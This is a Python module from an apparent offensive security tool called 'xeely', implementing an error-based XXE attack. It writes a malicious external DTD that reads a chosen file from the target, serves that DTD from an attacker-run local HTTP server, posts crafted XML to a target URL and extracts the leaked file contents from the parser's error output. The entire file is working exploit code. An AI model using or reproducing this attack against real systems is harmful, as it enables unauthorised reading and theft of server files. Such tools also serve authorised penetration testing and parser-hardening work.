import os
from typing import Optional
from typing import Sequence

from xeely import RESOURCES_PATH
from xeely.custom_http import HTTPClient
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_http.server import run_http_server
from xeely.custom_xml import XML
from xeely.custom_xml import XMLDoctype
from xeely.custom_xml import XMLEntity
from xeely.xxe import cdata
from xeely.xxe.attacks.base import BaseXXEAttack
from xeely.xxe.attacks.factory import factory
from xeely.xxe.doctype import write_doctype_content_to_disk
from xeely.xxe.errors import InvalidOptionException
from xeely.xxe.errors import ReverseConnectionParamsNotSpecified
from xeely.xxe.strategy import XXEAttackStrategy

ERROR_DTD_FILE_PATH = RESOURCES_PATH / "error.dtd"
ERROR_ENTITY_NAME = "error"
SEPARATOR = "=="


def create_error_dtd_file(
    resource: str, http_server_params: HTTPServerParams, use_cdata_flag: bool
):
    entity_name_to_use = cdata.CDATA_EXPLOIT_ENTITY_NAME if use_cdata_flag else "file"

    if use_cdata_flag:
        entities = [
            *cdata.get_cdata_entities(resource),
            cdata.get_cdata_joined_entity(is_parameter=True),
        ]
    else:
        entities = [
            XMLEntity(
                _name=entity_name_to_use, _value=resource, _is_external=True, _is_parameter=True
            )
        ]

    entities = [
        *entities,
        XMLEntity(
            _name=ERROR_ENTITY_NAME,
            _value=XMLEntity(
                _name="content",
                _value=f"%nonExistingEntity;{SEPARATOR}%{entity_name_to_use};{SEPARATOR}",
                _is_external=True,
            )
            .to_xml()
            .replace('"', "'"),
            _is_parameter=True,
        ),
    ]

    write_doctype_content_to_disk(ERROR_DTD_FILE_PATH, entities)


def delete_error_dtd_file():
    os.remove(ERROR_DTD_FILE_PATH)


@factory.register(name=XXEAttackStrategy.ERROR_BASED.value)
class ErrorBasedAttack(BaseXXEAttack):
    def __init__(
        self,
        target_url: str,
        xml: XML,
        encode_data_with_base64: bool,
        use_cdata_tag: bool,
        http_server_params: Optional[HTTPServerParams],
    ):
        super().__init__(
            target_url, xml, encode_data_with_base64, use_cdata_tag, http_server_params
        )

    def _check_params(self):
        if self.get_http_server_params() is None:
            raise ReverseConnectionParamsNotSpecified()
        if self.get_encode_data_with_base64():
            raise InvalidOptionException("phpfilter")

    def _configure_xml_for_attack(self, resource: str):
        http_server_params = self.get_http_server_params()
        if http_server_params is None:
            raise ReverseConnectionParamsNotSpecified()

        entities: Sequence[XMLEntity | str] = [
            XMLEntity(
                _name="remote",
                _value=f"{http_server_params.get_base_url()}/{ERROR_DTD_FILE_PATH.name}",
                _is_external=True,
                _is_parameter=True,
            ),
            "%remote;",
            f"%{ERROR_ENTITY_NAME};",
        ]

        xml = self.get_xml()
        doctype = XMLDoctype(xml.get_root_node_name(), entities)

        xml.set_doctype(doctype)

    def _run_attack(self) -> str:
        http_server_params = self.get_http_server_params()
        if http_server_params is None:
            raise ReverseConnectionParamsNotSpecified()

        with run_http_server(
            lhost=http_server_params.get_host(), lport=http_server_params.get_port()
        ):
            create_error_dtd_file(
                resource=self.get_resource(),
                http_server_params=http_server_params,
                use_cdata_flag=self.get_use_cdata_tag(),
            )
            response = HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
            delete_error_dtd_file()

            body_split = response.body.split(SEPARATOR)
            data = "" if len(body_split) != 3 else body_split[1]
            return data
